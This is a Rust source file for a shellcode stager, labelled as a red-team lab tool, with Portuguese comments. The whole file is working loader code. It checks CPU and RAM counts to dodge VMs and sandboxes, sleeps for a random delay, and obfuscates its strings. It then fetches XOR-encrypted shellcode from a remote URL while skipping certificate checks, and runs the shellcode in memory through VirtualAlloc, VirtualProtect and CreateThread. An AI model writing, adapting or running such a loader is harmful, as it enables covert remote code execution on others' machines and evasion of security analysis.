// ========================================================
// rusta-stager/src/main.rs
// Rust Stager - Lab Red Team 2026 (VERSÃO FINAL FUNCIONANDO)
// ========================================================
use clap::Parser;
use log::{error, info, warn};
use obfstr::obfstr;
use rand::Rng;
use reqwest::blocking;
use std::error::Error;
use std::time::Duration;

// ==================== WINDOWS API ====================
use windows::Win32::System::Memory::*;
use windows::Win32::System::Threading::*;
// ========================================================

#[derive(Parser)]
#[command(author, version, about = "Rust Stager - Lab Red Team 2026", long_about = None)]
struct Args {
    #[command(subcommand)]
    command: Commands,
}

#[derive(clap::Subcommand)]
enum Commands {
    /// Mostra informações do sistema + anti-VM
    Info,
    /// Baixa e executa shellcode in-memory
    Execute {
        #[arg(short, long, required = true)]
        url: String,
    },
}

fn main() -> Result<(), Box<dyn Error>> {
    env_logger::init();
    let args = Args::parse();

    if !anti_analysis_check() {
        std::process::exit(1);
    }

    match args.command {
        Commands::Info => run_info(),
        Commands::Execute { url } => execute_shellcode(&url)?,
    }
    Ok(())
}

fn anti_analysis_check() -> bool {
    let sys = sysinfo::System::new_all();

    if sys.cpus().len() < 4 {
        warn!("{} Poucos núcleos CPU - possível VM", obfstr!("[!]"));
        return false;
    }
    if sys.total_memory() < 7_000_000_000 {
        warn!("{} Pouca RAM - possível sandbox", obfstr!("[!]"));
        return false;
    }

    let delay = rand::thread_rng().gen_range(1200..4500);
    std::thread::sleep(Duration::from_millis(delay));

    info!("{} Anti-analysis passed", obfstr!("[+]"));
    true
}

fn run_info() {
    let sys = sysinfo::System::new_all();
    info!("{} === Red Team Lab Stager ===", obfstr!("[*]"));
    info!("OS: {}", sysinfo::System::long_os_version().unwrap_or_default());
    info!("CPU Cores: {}", sys.cpus().len());
    info!("RAM Total: {} GB", sys.total_memory() / 1024 / 1024 / 1024);
    info!("{} Pronto para uso no Lab!", obfstr!("[+]"));
}

fn execute_shellcode(url: &str) -> Result<(), Box<dyn Error>> {
    info!("{} Baixando shellcode de: {}", obfstr!("[*]"), url);

    let client = blocking::Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(30))
        .build()?;

    let encrypted_data = client.get(url).send()?.bytes()?;
    let shellcode = decrypt_xor(&encrypted_data, b"LAB_REDTTEAM_2026_KEY_XOR");

    if shellcode.is_empty() {
        error!("{} Shellcode vazio!", obfstr!("[!]"));
        return Err("Shellcode vazio".into());
    }

    unsafe {
        let addr = VirtualAlloc(
            None,
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );

        if addr.is_null() {
            return Err("VirtualAlloc falhou".into());
        }

        std::ptr::copy_nonoverlapping(shellcode.as_ptr(), addr as *mut u8, shellcode.len());

        let mut old_protect = PAGE_PROTECTION_FLAGS(0);
        VirtualProtect(addr, shellcode.len(), PAGE_EXECUTE_READWRITE, &mut old_protect);

        // ====================== THREAD CORRIGIDA (windows 0.57) ======================
        let start_routine: LPTHREAD_START_ROUTINE = Some(std::mem::transmute(addr));

        let thread = CreateThread(
            None,                          // lpThreadAttributes
            0,                             // dwStackSize
            start_routine,                 // lpStartAddress (Option<fn>)
            None,                          // lpParameter
            THREAD_CREATION_FLAGS(0),      // dwCreationFlags
            None,                          // lpThreadId
        )
        .map_err(|e| format!("CreateThread falhou: {:?}", e))?;

        if thread.is_invalid() {
            error!("{} Falha ao criar thread", obfstr!("[!]"));
            return Err("Thread inválida".into());
        }

        info!("{} Shellcode executado in-memory com sucesso!", obfstr!("[+]"));
        WaitForSingleObject(thread, INFINITE);
        // ============================================================================
    }

    Ok(())
}

fn decrypt_xor(data: &[u8], key: &[u8]) -> Vec<u8> {
    data.iter()
        .zip(key.iter().cycle())
        .map(|(&b, &k)| b ^ k)
        .collect()
}